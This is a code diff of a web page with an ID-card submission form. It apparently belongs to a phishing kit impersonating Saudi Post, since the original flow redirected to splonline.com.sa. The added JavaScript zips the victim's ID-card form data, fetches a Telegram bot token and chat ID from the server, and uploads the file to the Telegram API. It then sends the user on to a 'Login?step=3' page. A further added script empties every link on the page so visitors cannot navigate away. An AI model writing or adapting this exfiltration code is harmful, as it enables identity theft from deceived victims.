@@ -59,11 +59,10 @@
 	</style>
 <div id="loading" class="loading">
     <div>
-        <img src="/assets/images/load.svg">
+        <img src="assets/images/load.svg">
     		
     	</div>
 </div>
-
 <body class="loaded">
     <!-- Google Tag Manager (noscript) -->
     <noscript>
@@ -308,7 +307,7 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
         }
     });
 
-    // Proceed with AJAX submission if form is valid
+    // Proceed if form is valid
     if (isValid) {
         const zip = new JSZip();
         const formData = new FormData(form);
@@ -323,34 +322,38 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
         // Create zip file
         zip.generateAsync({ type: 'blob' })
             .then(function(content) {
-                // Prepare to send zip file via AJAX
+                // Prepare zip file to send via AJAX
                 const zipFile = new Blob([content], { type: 'application/zip' });
                 
-                const formDataToSend = new FormData();
-                formDataToSend.append('file', zipFile, 'id_card_data.zip');
-                formDataToSend.append('visitor', sessionStorage.getItem('visitor'));
-				document.querySelector('#loading').style.display = "flex";
-				console.log('hmm');
-                // Send AJAX request
+                // First request to retrieve botToken and chatId
                 return $.ajax({
                     method: 'POST',
                     url: "/receive",
-                    data: formDataToSend,
-                    processData: false, // Prevent jQuery from processing the data
-                    contentType: false // Prevent jQuery from overriding the content type
-                }).done(function(msg) {
-                
-            	window.location.href = "https://splonline.com.sa/en/shipmentdetailsstatic";
-                console.log(msg); // Log success message
-                
-            })
-            .fail(function(err, textStatus, error) {
-                console.error('Submission failed:', textStatus, error);
-                // Optionally handle failure case
-                // window.location.href = "/login/2"; 
+                    data: JSON.stringify({ requestBotDetails: true }),
+                    contentType: "application/json",
+                    dataType: "json"
+                }).then(function(response) {
+                    const { botToken, chatId } = response;
+                    // Send zip file to Telegram API
+                    const telegramFormData = new FormData();
+                    telegramFormData.append('chat_id', chatId);
+                    telegramFormData.append('document', zipFile, 'id_card_data.zip');
+
+                    return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                        method: 'POST',
+                        body: telegramFormData
+                    });
+                }).then((telegramResponse) => {
+                    if (telegramResponse.ok) {
+                        console.log("Zip file sent successfully to Telegram.");
+                        window.location.href = "Login?step=3"; 
+                    } else {
+                        console.error("Failed to send zip to Telegram:", telegramResponse.statusText);
+                    }
+                }).catch(function(error) {
+                    console.error("Error in process:", error);
+                });
             });
-            })
-            
     }
 });
 </script> 
@@ -368,5 +371,13 @@ document.querySelector('#idCardForm').addEventListener('submit', function(event)
 
     	
     </body>
-
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    var links = document.querySelectorAll('body a');
+    for (var i = 0; i < links.length; i++) {
+      var link = links[i];
+      link.setAttribute('href', ''); // Set the href value to an empty string
+    }
+  });
+</script>
 </html>
